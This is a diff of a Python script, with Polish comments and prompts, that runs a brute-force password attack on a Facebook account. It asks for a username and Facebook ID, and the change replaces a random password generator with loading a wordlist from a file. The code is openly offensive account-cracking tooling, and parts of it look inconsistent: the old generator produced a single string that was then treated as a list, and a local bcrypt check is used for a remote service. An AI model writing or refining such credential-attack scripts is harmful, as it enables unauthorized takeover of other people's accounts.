@@ -7,17 +7,9 @@ from bcrypt import hashpw, checkpw
 def verify_password(password, hashed_password):
     return checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))
 
-def generate_passwords(length=12, symbols=True, numbers=True, uppercase=True, lowercase=True):
-    characters = []
-    if symbols:
-        characters += ['!', '@', '#', '$', '%', '&', '(', ')', '*', '+']
-    if numbers:
-        characters += ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
-    if uppercase:
-        characters += [chr(i) for i in range(ord('A'), ord('Z') + 1)]
-    if lowercase:
-        characters += [chr(i) for i in range(ord('a'), ord('z') + 1)]
-    return ''.join([random.choice(characters) for _ in range(length)])
+def read_passwords_from_file(filename):
+    with open(filename, 'r') as file:
+        return file.read().splitlines()
 
 def brute_force(username, fb_id, passwords):
     for password in passwords:
@@ -41,15 +33,19 @@ def main():
     # Pobierz dane użytkownika
     username = input('Podaj nazwę użytkownika: ')
     fb_id = input('Podaj identyfikator Facebooka: ')
-
-    # Wygeneruj listę haseł
-    passwords = generate_passwords(length=12, symbols=True, numbers=True, uppercase=True, lowercase=True)
+    
+    # Pobierz nazwę pliku z listą haseł
+    filename = input('Podaj nazwę pliku z listą haseł: ')
+    
+    # Wczytaj listę haseł z pliku
+    passwords = read_passwords_from_file(filename)
 
     # Wykonaj atak siłowy
     brute_force(username, fb_id, passwords)
 
 if __name__ == '__main__':
     main()
+
 
 
 
